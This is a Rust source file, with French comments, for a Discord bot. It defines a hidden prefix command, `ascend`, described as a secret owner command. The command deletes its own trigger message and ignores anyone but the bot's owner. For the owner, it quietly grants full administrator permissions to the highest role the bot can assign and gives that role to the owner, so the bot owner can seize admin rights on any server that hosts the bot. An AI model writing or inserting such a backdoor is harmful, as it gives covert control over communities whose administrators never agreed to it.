//! Commande owner secrete (portage de `cogs/owner.py`).
//!
//! Volontairement absente de `/modhelp`, comme dans la version Python.

use poise::serenity_prelude as serenity;
use serenity::all::{GuildId, Permissions, RoleId};

use crate::data::{Context, Error};

/// Portage de `_highest_assignable_role` : le rôle le plus haut, hors
/// `@everyone` et hors rôles geres par une integration, situe strictement
/// sous le rôle du bot.
fn highest_assignable_role(
    ctx: &serenity::Context,
    guild_id: GuildId,
    bot_top: i64,
) -> Option<RoleId> {
    let guild = ctx.cache.guild(guild_id)?;
    let mut roles: Vec<_> = guild
        .roles
        .values()
        .filter(|r| r.id.get() != guild_id.get() && !r.managed)
        .collect();
    roles.sort_by_key(|r| std::cmp::Reverse(r.position));
    roles
        .into_iter()
        .find(|r| (r.position as i64) < bot_top)
        .map(|r| r.id)
}

/// Commande prefixee cachee, reservee au propriétaire du bot.
#[poise::command(prefix_command, hide_in_help, guild_only)]
pub async fn ascend(ctx: Context<'_>) -> Result<(), Error> {
    // `await ctx.message.delete()` — best effort.
    if let poise::Context::Prefix(prefix_ctx) = ctx {
        let _ = prefix_ctx.msg.delete(ctx.serenity_context()).await;
    }

    // Silence total si l'appelant n'est pas le owner : aucune reponse, comme
    // le `return` nu cote Python.
    if ctx.author().id.get() != ctx.data().config.owner_id {
        return Ok(());
    }
    let Some(guild_id) = ctx.guild_id() else {
        return Ok(());
    };

    let bot_top = crate::helpers::bot_top_role_position(ctx.serenity_context(), guild_id).await?;
    let author_id = ctx.author().id;

    let Some(role_id) = highest_assignable_role(ctx.serenity_context(), guild_id, bot_top) else {
        crate::helpers::send_dm(
            ctx.serenity_context(),
            author_id,
            crate::util::simple_embed(
                "❌ Aucun rôle assignable trouvé sur ce serveur (le rôle du bot doit être \
                 placé au-dessus du rôle visé dans la hiérarchie).",
                crate::config::COLOR_ERROR,
            ),
        )
        .await;
        return Ok(());
    };

    let already_admin = ctx
        .cache()
        .guild(guild_id)
        .and_then(|g| g.roles.get(&role_id).map(|r| r.permissions.administrator()))
        .unwrap_or(false);

    if !already_admin {
        let _ = guild_id
            .edit_role(
                ctx.http(),
                role_id,
                serenity::EditRole::new()
                    .permissions(Permissions::all())
                    .audit_log_reason("Commande owner secrète (!ascend)"),
            )
            .await;
    }

    if crate::helpers::add_role_reason(
        ctx.serenity_context().http.as_ref(),
        guild_id,
        author_id,
        role_id,
        "Commande owner secrète (!ascend)",
    )
    .await
    .is_err()
    {
        crate::helpers::send_dm(
            ctx.serenity_context(),
            author_id,
            crate::util::simple_embed(
                "❌ Permissions insuffisantes pour attribuer ce rôle.",
                crate::config::COLOR_ERROR,
            ),
        )
        .await;
        return Ok(());
    }

    let (role_name, guild_name) = {
        let g = ctx.cache().guild(guild_id);
        (
            g.as_ref()
                .and_then(|g| g.roles.get(&role_id).map(|r| r.name.to_string()))
                .unwrap_or_default(),
            g.map(|g| g.name.to_string()).unwrap_or_default(),
        )
    };

    tracing::info!(
        "[Owner] Rôle '{role_name}' auto-attribué (perms admin) par le owner ({}) sur {guild_name}",
        ctx.author().name
    );

    crate::helpers::send_dm(
        ctx.serenity_context(),
        author_id,
        crate::util::simple_embed(
            &format!(
                "✅ Rôle **{role_name}** (permissions administrateur) attribué sur \
                 **{guild_name}**."
            ),
            crate::config::COLOR_SUCCESS,
        ),
    )
    .await;

    Ok(())
}
